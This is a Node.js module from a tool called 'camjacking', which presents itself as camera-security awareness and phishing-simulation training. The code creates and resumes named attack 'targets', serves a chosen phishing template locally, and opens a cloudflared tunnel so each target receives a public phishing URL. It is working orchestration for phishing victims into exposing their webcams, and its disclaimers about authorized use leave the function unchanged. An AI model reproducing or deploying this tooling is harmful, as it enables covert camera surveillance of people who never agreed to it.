#!/usr/bin/env node
/**
 * Camjacking - Camera Awareness & Security Training Toolkit (CLI)
 * ---------------------------------------------------------------
 *
 * Author      : Karthikeyan (https://karthithehacker.com)
 * GitHub      : https://github.com/karthi-the-hacker/camjacking
 * Project     : camjacking - A CLI framework for camera security awareness, phishing simulation, and cybersecurity training labs.
 *
 * License     : Open-source — strictly for educational, awareness, and authorized security training purposes ONLY.
 *
 * Note to Users:
 * --------------
 * 🔐 This tool is intended solely for educational use, security awareness programs, and authorized red-team / lab environments.
 * 🚫 Unauthorized use of this tool against individuals, devices, or networks without explicit permission is illegal and unethical.
 * ❗ If you use or modify this code, PLEASE GIVE PROPER CREDIT to the original author and repository.
 *
 * Warning to Code Thieves:
 * ------------------------
 * ❌ Removing this header or claiming this project as your own without credit is unethical and violates open-source community principles.
 * 🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
 * ✅ Be an ethical hacker. Respect developers' efforts and give credit where it’s due.
 */

const { phishingServer  } = require('./server');
const { createAttack,getAttacks,getChatId  } = require("./dbgateway");
const { randomUUID } = require("crypto");
const { showTemplateMenuAndSelect,ensureTemplatesRepo  } = require('./templates');
const {sleep,RED,ORANGE,RESET,startLoader } = require('./const');
const { mainbanner } = require('./banner');
const { spawn } = require("child_process");


async function createattack(name, rl,mainMenu) {
  const uuid = randomUUID();
  const now = new Date();

  const result = await showTemplateMenuAndSelect(rl);

  if (result.action === "select") {
    const currentDateTime = 
    `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, "0")}-${String(now.getDate()).padStart(2, "0")} ` +
    `${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}:${String(now.getSeconds()).padStart(2, "0")}`;
    await createAttack({
        uuid,
        datetime: currentDateTime,
        name,
        template: result.name
        });
    
    
    const stop = startLoader("Starting server");
    let publicUrl = null;
    try {
      publicUrl = await startCloudflareTunnel("http://localhost:8080");
    } catch (e) {
      console.error("Failed to start tunnel:", e);
    }
    stop(); 
    mainbanner();
    console.log(`\n[+] New Target Created: ${ORANGE}${name}${RESET}`);
    console.log(`[+] ${ORANGE}${name}${RESET} UUID: ${ORANGE}${uuid}${RESET}`);
    console.log(`[+] Template selected: ${ORANGE}${result.name}${RESET}`);
    console.log(`[+] Admin page URL: ${ORANGE}http://localhost:5000/${RESET}`);
    console.log(`[+] Camjacking server running at: ${ORANGE}http://localhost:8080/?uuid=${uuid}${RESET}`);

    if (publicUrl) {
      console.log(`[+] Camjacking server Target URL: ${ORANGE}${publicUrl}?uuid=${uuid}${RESET}`);
    }

    console.log(`[+] Serving files from: ${ORANGE}${result.path}${RESET}`);
    console.log(`[+] Created At: ${ORANGE}${currentDateTime}${RESET}`);

    const server = phishingServer(name,publicUrl,result.name,result.path, 8080, rl, mainMenu);
      
    
 
  }
  
  else {
    console.log("\n[!] Returning to previous menu...");
  }

}

async function resumeattack(name,template,uuid, currentDateTime,rl,mainMenu) {

    const templates = ensureTemplatesRepo();
    const stop = startLoader("Starting server");
    let publicUrl = null;
    const finalpath = templates + "/" + template;
    console.log(finalpath);
    try {
      publicUrl = await startCloudflareTunnel("http://localhost:8080");
    } catch (e) {
      console.error("Failed to start tunnel:", e);
    }
    stop(); 
    mainbanner();
    console.log(`\n[+] New Target Created: ${ORANGE}${name}${RESET}`);
    console.log(`[+] ${ORANGE}${name}${RESET} UUID: ${ORANGE}${uuid}${RESET}`);
    console.log(`[+] Template selected: ${ORANGE}${template}${RESET}`);
    console.log(`[+] Admin page URL: ${ORANGE}https://cappriciosec.com/camjacking${RESET}`);
    console.log(`[+] Camjacking server running at: ${ORANGE}http://localhost:8080/?uuid=${uuid}${RESET}`);

    if (publicUrl) {
      console.log(`[+] Camjacking server Target URL: ${ORANGE}${publicUrl}?uuid=${uuid}${RESET}`);
    }

    console.log(`[+] Serving files from: ${ORANGE}${finalpath}${RESET}`);
    console.log(`[+] Created At: ${ORANGE}${currentDateTime}${RESET}`);

    const server = phishingServer(name,publicUrl,template,finalpath, 8080, rl, mainMenu);
  
  }

function pad(str, width) {
  str = String(str ?? "");
  return str.length > width
    ? str.slice(0, width - 1) + "…"
    : str.padEnd(width, " ");
}

function showSelectTargetMenu(rl, onSelect, onBack) {
  const attacks = getAttacks();

  if (!attacks || attacks.length === 0) {
    console.log("\n[!] No existing targets found.\n");
    return onBack?.();
  }

  const COL_NO = 4;
  const COL_NAME = 15;
  const COL_UUID = 36;
  const COL_TEMPLATE = 19;
  const COL_DATE = 19;

  console.log(`\n${RED}     Select Existing Target\n${RESET}`);

  const top =
`${RESET}┏━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┓
${RESET}┃ No ┃ Target Name    ┃ UUID                                 ┃ Template           ┃ Created At          ┃
${RESET}┡━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━┩`;

  console.log(top);

  attacks.forEach((atk, i) => {
    const no = pad(i + 1, COL_NO - 1);
    const name = pad(atk.name, COL_NAME);
    const uuid = pad(atk.uuid, COL_UUID);
    const template = pad(atk.template, COL_TEMPLATE);
    const date = pad(atk.datetime, COL_DATE);

    const row =
`${RESET}┃ ${RED}${no}${RESET}┃ ` +
`${ORANGE}${name}${RESET}┃ ` +
`${uuid} ┃ ` +
`${template}┃ ` +
`${date} ┃`;

    console.log(row);
  });

  const bottom =
`${RESET}└────┴────────────────┴──────────────────────────────────────┴────────────────────┴─────────────────────┘`;

  console.log(bottom);
  console.log(`${RESET}Enter target number (or 0 to go back):`);

  rl.question("👉 Select: ", (ans) => {
    const idx = parseInt(ans.trim(), 10);

    if (idx === 0) return onBack?.();

    if (Number.isNaN(idx) || idx < 1 || idx > attacks.length) {
      console.log("\n❌ Invalid selection.\n");
      return showSelectTargetMenu(rl, onSelect, onBack);
    }

    const selected = attacks[idx - 1];
    onSelect?.(selected);
  });
}



function startCloudflareTunnel(localUrl = "http://localhost:8080") {
  return new Promise((resolve, reject) => {
    const cf = spawn("cloudflared", ["tunnel", "--url", localUrl], {
      stdio: ["ignore", "pipe", "pipe"] // silence default output
    });

    let resolved = false;

    const onData = (data) => {
      const text = data.toString();

      // Match any trycloudflare URL
      const match = text.match(/https:\/\/[^\s|]+\.trycloudflare\.com/);
      if (match && !resolved) {
        resolved = true;
        resolve(match[0]);
      }
    };

    cf.stdout.on("data", onData);
    cf.stderr.on("data", onData); // some versions print URL to stderr

    cf.on("error", reject);

    process.on("SIGINT", () => {
      cf.kill("SIGINT");
      process.exit(0);
    });
  });
}



module.exports = { createattack ,showSelectTargetMenu,resumeattack};
